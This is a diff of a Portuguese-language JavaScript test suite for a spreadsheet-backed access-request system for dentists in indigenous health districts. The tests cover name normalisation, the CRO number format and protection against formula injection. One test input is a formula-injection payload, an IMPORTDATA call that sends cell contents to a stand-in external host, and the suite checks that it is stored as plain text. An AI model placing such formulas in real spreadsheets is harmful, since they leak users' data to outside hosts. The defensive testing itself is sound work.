@@ -54,12 +54,13 @@ T("pedido com UF que não é do DSEI é recusado", !r.ok);
 /* ---------------------------------------------------------------- planilha: fórmulas */
 parte("planilha");
 const nomeMau = '=IMPORTDATA("https://exemplo.invalido/?x="&A1)';
-r = P(null, { acao: "pedirAcesso", nome: nomeMau, cro: "+5511", email: "formula@teste.org", uf: "RR", dsei: "Yanomami", polo: "@polo", perfil: "dentista" });
+T("CRO com cara de fórmula (+5511) é recusado antes de gravar", !P(null, { acao: "pedirAcesso", nome: "Fulano", cro: "+5511", email: "formula0@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista" }).ok);
+r = P(null, { acao: "pedirAcesso", nome: nomeMau, cro: "RR 5511", email: "formula@teste.org", uf: "RR", dsei: "Yanomami", polo: "@polo", perfil: "dentista" });
 T("pedido de acesso com fórmula no nome é aceito como texto", r.ok, r);
 const linhaF = aba("Usuarios").find(l => l[3] === "formula@teste.org");
-T("nome, CRO e polo gravados com proteção (sem virar fórmula)", G.est.formulas.length === 0 && linhaF[1] === "'" + nomeMau, G.est.formulas.slice(0, 3));
+T("nome e polo gravados com proteção (sem virar fórmula)", G.est.formulas.length === 0 && linhaF[1] === "'" + nomeMau, G.est.formulas.slice(0, 3));
 const lido = G.ctx.lerUsuarios().find(u => u.email === "formula@teste.org");
-T("ao ler, o nome volta igual ao digitado", lido && lido.nome === nomeMau && lido.cro === "+5511", lido && lido.nome);
+T("ao ler, o nome volta igual ao digitado", lido && lido.nome === nomeMau && lido.cro === "RR 5511", lido && lido.nome);
 
 /* ---------------------------------------------------------------- e-mails usam o endereço oficial */
 parte("endereço dos e-mails");
@@ -1343,7 +1344,27 @@ parte("nomes num padrão só");
   T("nome todo em maiúsculas ou minúsculas fica no padrão (de, da, do, das, dos e e minúsculos)", np("LUCIANA GOUVÊA LUCENA AOUN") === "Luciana Gouvêa Lucena Aoun" && np("stephen sadamy dantas mesquita") === "Stephen Sadamy Dantas Mesquita" && np("MARIA DAS DORES E SILVA") === "Maria das Dores e Silva");
   T("hífen e apóstrofo, siglas e texto que não é nome ficam certos", np("ana-luíza d'ávila") === "Ana-Luíza D'Ávila" && np("Rita RT") === "Rita RT" && np("=IMPORTDATA(x)") === "=IMPORTDATA(x)");
   const r = R.P(null, { acao: "pedirAcesso", nome: "JOANA DA SILVA", cro: "RR 9191", email: "joana@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista" });
+  T("nome de quem aprovou também no padrão, mantendo a nota", require("vm").runInContext('nomeComNota("LUCIANA GOUVÊA LUCENA AOUN (convite)")', R.G.ctx) === "Luciana Gouvêa Lucena Aoun (convite)");
   T("pedido de acesso grava o nome no padrão", r.ok && R.G.est.sheets.Usuarios.some(l => l[1] === "Joana da Silva"));
+}
+
+parte("CRO no padrão UF e número");
+{
+  const R = cenario(), cp = n => require("vm").runInContext("croPadrao(" + JSON.stringify(n) + ")", R.G.ctx);
+  T("CRO escrito de vários jeitos fica no padrão", cp("cro-pe 9100") === "PE 9100" && cp("RR 01623") === "RR 1623" && cp("PE9100") === "PE 9100" && cp("CRO 7099") === "7099");
+  const sem = R.P(null, { acao: "pedirAcesso", nome: "Teste Sem Uf", cro: "7099", email: "semuf@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista" });
+  T("cadastro com CRO sem a UF é recusado", !sem.ok && /UF do conselho/.test(sem.erro || ""), sem);
+  const com = R.P(null, { acao: "pedirAcesso", nome: "Teste Com Uf", cro: "pe 9100", email: "comuf@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista" });
+  const cab = R.G.est.sheets.Usuarios[0];
+  T("cadastro grava o CRO no padrão", com.ok && R.G.est.sheets.Usuarios.find(l => l[3] === "comuf@teste.org")[cab.indexOf("cro")] === "PE 9100");
+  // Cadastro antigo, com o CRO sem a UF: continua entrando, é avisado e corrige o próprio CRO.
+  const lin = R.G.est.sheets.Usuarios.find(l => l[3] === "ana@teste.org"); lin[cab.indexOf("cro")] = "CRO 7099";
+  require("vm").runInContext("cadastrosMudaram()", R.G.ctx);
+  const e = R.P(R.ANA, { acao: "entrar", aparelho: "Teste" });
+  T("cadastro antigo com CRO sem a UF continua entrando e recebe o aviso", e.ok && e.usuario.croIncompleto === true && e.usuario.cro === "7099", e.usuario);
+  T("corrigir o CRO exige a UF", !R.P(R.ANA, { acao: "corrigirCro", cro: "7099" }).ok);
+  const c = R.P(R.ANA, { acao: "corrigirCro", cro: "RR 7099" });
+  T("a pessoa completa o CRO; o cadastro é o mesmo e a mudança fica em Acessos", c.ok && c.usuario.cro === "RR 7099" && !c.usuario.croIncompleto && c.usuario.id === lin[0] && R.G.est.sheets.Acessos.some(l => /Corrigiu o CRO/.test(l.join("|")) && /7099 → RR 7099/.test(l.join("|"))));
 }
 
 console.log(falhas ? `\n${falhas} de ${total} verificações FALHARAM.` : `\nTudo certo: ${total} verificações do servidor passaram.`);
